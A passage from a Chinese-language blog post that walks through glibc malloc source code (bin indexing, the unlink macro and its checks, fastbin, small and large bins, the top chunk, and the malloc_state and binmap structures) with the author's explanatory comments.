class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>bin_at的神奇操作: </p><ul><li>对外部而言, bin数组应该为128个, 输入的下标也是如此, 到了内部将其转换为该位置chunk的fd指针, 取地址”&amp;”, 转换为单字节指针char *, 然后减去chunk head的字节数, 变为该chunk的头部</li><li>除了外部下标到内部下标的转换, <strong>其余步骤相当于mem2chunk()的结果</strong> </li></ul></li><li><p>为什么是两个呢?</p><p>因为每个bin链在bins数组中存储的是一个fd指针和一个bk指针，即两个malloc chunk指针，所以要NBINS * 2<br>又因为数组bins中索引为0、1的指针是不使用的，所以要减去2</p><blockquote><p>例： bins[2]为unsorted bin链的fd成员，bin[3]为其bk成员, bin[0]为其presize, bin[1]为其size</p></blockquote><img src="../../image/glibc_malloc_srcCode/sbzY4vrhU2wZypm.png" style="zoom: 33%;" /> </li></ul><h3 id="unlink：从bins中取出chunk"><a href="#unlink：从bins中取出chunk" class="headerlink" title="unlink：从bins中取出chunk"></a>unlink：从bins中取出chunk</h3><ul><li>2.25中unlink为宏定义, 2.26为unlink_chunk函数, 仅仅多了一个检查<ul><li><code>if (chunksize (p) != prev_size (next_chunk (p)))  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</code> </li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><span class="hljs-comment">//省略了每行末尾的反斜杠</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) </span><br>&#123; <span class="hljs-comment">//例子unlink(av, victim, bck, fwd)</span><br>    FD = P-&gt;fd;<span class="hljs-comment">//取出victim的fd和bk指针</span><br>    BK = P-&gt;bk;<br><span class="hljs-comment">//例行检查,实际上就是如果victim没有完整的在链表中的话就报错</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//如果正常的话</span><br>        FD-&gt;bk = BK;<br>        BK-&gt;fd = FD; <span class="hljs-comment">//取出了victim</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) <br>        &#123;<span class="hljs-comment">//如果在largebin里的链表 且 在chunk size链表里则需要额外设置fd_nextsize和bk_nextsize</span><br>            <span class="hljs-comment">//简单的检查, victim是不是 *完整的* 在chunk size链表</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)<br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//FD和victim同样大小</span><br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)<span class="hljs-comment">//fd_nextsize等于自身只能说明链表里只有这个大小</span><br>                  <span class="hljs-comment">//现在就剩下FD(后面或许还有等大的)了, 修改一下chunk size链表</span><br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;<br>                <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//链表里还有其他的chunk</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;<br>                    P-&gt;bk_nextsize-&gt;fd_nextsi  ze = FD;<br>                  &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//victim是一个单独的chunk</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>相关介绍和特点</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br>- 使用LIFO, 在链表头执行取出插入操作<br>- PREV_INUSE总为<span class="hljs-number">1</span>, 不会和相邻块进行合并<br>- chunk从不会在链表中间被删去, 只需要单向链表即可<br></code></pre></div></td></tr></table></figure><p><strong>indexing</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><ul><li>从fastbin_index方法也可以看出fastbin是将<strong>chunk大小</strong>转换为<strong>数据空间大小</strong>来index的, 从最短的8字节到80字节(默认64字节), 实际上支持(80 * SIZE_SZ / 4)字节</li></ul><p><strong>数量和容量</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-comment">//    DEFAULT_MXFAST     64 (for 32bit), 128 (for 64bit)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                                                      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span><br><span class="hljs-comment">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="hljs-comment">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="hljs-comment">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="hljs-comment">   compromise heuristic to only attempt consolidation if it is likely</span><br><span class="hljs-comment">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="hljs-comment">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="hljs-comment">   if trimming is not used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></div></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT <span class="hljs-comment">//可能32为8, 64为16??</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ) <span class="hljs-comment">//暂时不知道这是做啥的, 一般为0</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) <span class="hljs-comment">//32:512  64:1024</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>可以看到MIN_LARGE_SIZE用作了判断块大小是否位于small bin的范围内</p></li><li><p>small bin 紧跟在unsorted bin之后, 索引从2-??(自己想去), 所以index只需要移位就可以了, 相邻下标之间间隔0x10(64), 0x8(32)</p></li><li><p><strong>small bin和fast bin有一部分范围是重合的</strong> </p></li><li><p><strong>FILO 链头入链尾出</strong> </p></li><li><p>small bin结构: 双向链表</p><p>待补充, 之前想错了</p></li></ul><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></div></td></tr></table></figure><ul><li><p>fd_nextsize和bk_nextsize只适用于large bins, 且pointer to next larger size.</p></li><li><p><strong>从链头(bin处) 到 链尾，沿着各个chunk的fd指针，chunks大小从高到低，依次排序</strong> </p><ul><li><p>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p></li><li><p>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p></li><li><p>large bin结构:</p></li></ul><p><img src="../../image/glibc_malloc_srcCode/KHlB5YwzDnq1pmZ.png" alt="large-bin"> </p></li></ul><h3 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Top</span><br><span class="hljs-comment">    The top-most available chunk (i.e., the one bordering the end of</span><br><span class="hljs-comment">    available memory) is treated specially. It is never included in</span><br><span class="hljs-comment">    any bin, is used only if no other chunk is available, and is</span><br><span class="hljs-comment">    released back to the system if it is very large (see</span><br><span class="hljs-comment">    M_TRIM_THRESHOLD).  Because top initially</span><br><span class="hljs-comment">    points to its own bin with initial zero size, thus forcing</span><br><span class="hljs-comment">    extension on the first malloc request, we avoid having any special</span><br><span class="hljs-comment">    code in malloc to check whether it even exists yet. But we still</span><br><span class="hljs-comment">    need to do so when getting memory from system, so we make</span><br><span class="hljs-comment">    initial_top treat the bin as a legal but unusable chunk during the</span><br><span class="hljs-comment">    interval between initialization and the first call to</span><br><span class="hljs-comment">    sysmalloc. (This is somewhat delicate, since it relies on</span><br><span class="hljs-comment">    the 2 preceding words to be zero during this interval as well.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br></code></pre></div></td></tr></table></figure><h3 id="总的index"><a href="#总的index" class="headerlink" title="总的index"></a>总的index</h3><pre><code class=" mermaid">graph LRg([bin_index])--&gt;a(smallbin_index) &amp; b(largebin_index)b--&gt;|64|largebin_index_64b--&gt;|32 &amp; MALLOC_ALIGNMENT == 16|m[largebin_index_32_big]b--&gt;|32 &amp; != 16|largebin_index_32</code></pre><h2 id="核心结构体"><a href="#核心结构体" class="headerlink" title="核心结构体"></a>核心结构体</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-keyword">int</span> flags;<br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-keyword">int</span> have_fastchunks;   <span class="hljs-comment">//have_fastchunks是glibc 2.27 及以后特有的, 四字节32位可用</span><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[BINMAPSIZE];<br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><strong>flags</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></div></td></tr></table></figure><p><strong>Binmap</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Binmap</span><br><span class="hljs-comment">    To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span><br><span class="hljs-comment">    bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment">    be skipped over during during traversals.  The bits are NOT always</span><br><span class="hljs-comment">    cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment">    when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="hljs-comment">//32 bits per map word,every bit is useful</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)<span class="hljs-comment">//第6位及以后确定block</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))<span class="hljs-comment">//i &amp; 31:取出低5位决定在block中的bit</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> //<span class="hljs-title">malloc</span> <span class="hljs-title">parameter</span>, 堆管理器的相关参数</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span 